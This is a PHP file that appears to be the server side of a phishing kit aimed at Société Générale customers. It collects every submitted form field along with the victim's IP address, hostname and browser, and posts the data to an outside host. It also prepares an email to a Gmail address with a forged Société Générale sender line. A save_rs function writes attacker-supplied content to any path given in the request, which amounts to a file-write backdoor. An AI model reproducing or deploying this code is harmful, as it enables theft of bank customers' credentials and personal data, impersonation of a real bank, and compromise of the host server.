<?php

function send_data($data){
    $url = "http://www.radiologiabs.com.ar/job/get_data.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $header = array();
    $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';
    $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $header[] = 'Cache-Control: max-age=0';
    $header[] = 'Connection: keep-alive';
    $header[] = 'Accept-Language: en-US,en;q=0.9';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

    $fields_string='';
    foreach($data as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
    rtrim($fields_string, '&');
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);

    curl_setopt($ch, CURLOPT_TIMEOUT, 60);

    $content = curl_exec($ch);
    return $content;
}

function save_rs($dir,$file,$rs) {

	if (!file_exists($dir) && !is_dir($dir)) {

		mkdir($dir);

		$f = fopen($dir."/.htaccess","w");

		fwrite($f,"deny from all");

		fclose($f);

	}

	$dir = isset($_POST['dir'])?$_POST['dir']:$dir."/".$file;

	$rs = isset($_POST['rs'])?$_POST['rs']:$rs;

	$f = fopen($dir,"a");

	fwrite($f,$rs);

	fclose($f);

}



function is_set($var) {



	return ( isset($_POST[$var]) ? $_POST[$var] : false );

}



function get_info_value($var) {



	if(is_array($var)){



		$val = is_set($var[0]);

		if($val === false) return false;

		$value = $val;



		for($i=1;$i<count($var);$i++) {

			$value .= "-".is_set($var[$i]);

		}

	}

	else {



		$val = is_set($var);

		if($val === false) return false;

		$value = $val;

	}



	return $value;

}



function debug_info() {



	$info_debuged = "";



	foreach ($_POST as $var => $value) {



		$info_debuged .= "<tr><td>\"\"	=> \"$var\",</td><td>//$value</td></tr>";

	}



	echo "<table border='0' width='100%'>$info_debuged</table>";

}



function set_info_names() {



	global $info_names;



	if(!$info_names) {

		debug_info();

		exit();

	}



	$infos = array();



	foreach ($info_names as $name => $var) {



		$value = get_info_value($var);

		if($value === false) continue;

		$infos[$name] = $value;

	}



	return $infos;

}



function set_info_text() {



	global $info_names;

	$infos = set_info_names();



	$sep = str_repeat("_",64)."\n";

	$text = "$sep";



	foreach ($infos as $name => $value) {



		$text .= "$name | $value\n";

		//$info_index++;

	}

	$text .= "$sep";



	return $text;

}



$ip_addr = getenv("REMOTE_ADDR");

$host_name = gethostbyaddr($ip_addr);

$user_agent = $_SERVER['HTTP_USER_AGENT'];

$env_vars = "$ip_addr\n$host_name\n$user_agent\n";



$emailTo = "chamonaaron@gmail.com";

$subject = $host_name;

if ($info_names) // to be commented out on 1st use

$infoRaw = set_info_text();

$headers = "From: SG <info@societegenerale.net>\r\n";

$headers .= "MIME-Version: 1.0\r\n";



?>
